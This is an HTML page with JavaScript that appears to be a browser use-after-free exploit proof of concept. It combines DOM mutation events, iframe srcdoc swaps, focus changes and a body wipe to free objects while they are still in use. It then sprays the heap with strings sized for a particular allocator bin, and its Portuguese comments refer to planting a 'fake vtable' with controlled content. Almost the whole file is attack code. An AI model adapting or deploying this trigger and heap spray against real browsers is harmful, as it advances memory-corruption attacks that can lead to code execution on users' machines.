<!DOCTYPE html>
<html>
<body>
<iframe id="frame_a" loading="lazy"></iframe>
<iframe id="frame_b" srcdoc="b"></iframe>
<div id="container" tabindex="0" autofocus></div>
<div id="log"></div>
<script>
const logEl = document.getElementById("log");
let visit = localStorage.getItem("visit") || "0";
localStorage.setItem("visit", String(parseInt(visit) + 1));

const PAD = "A".repeat(64);
let sprayed = false;

logEl.addEventListener("DOMNodeRemoved", function handler() {
    if (sprayed) return;
    sprayed = true;
    logEl.removeEventListener("DOMNodeRemoved", handler);
    
    // Spray bin 160: StringImpl(128 chars) = 16 header + 128 = 144 → bin 160
    // Conteúdo controlado: 8 bytes de "vtable falsa" + resto
    window._spray = [];
    const content = "X".repeat(128);
    for (let i = 0; i < 500; i++) {
        window._spray.push(content);
    }
});

const op = () => {
    logEl.textContent += PAD;
    logEl.scrollTop = logEl.scrollHeight;
};

let frame = document.getElementById("frame_a");
op(); op();

addEventListener("load", () => {
    op();
    frame.srcdoc = "a";
    op();
    frame.contentWindow?.addEventListener("blur", () => {});
    frame.focus();
    op();
});

container.onfocusin = () => {
    document.body.innerHTML = "";
};
</script>
</body>
</html>
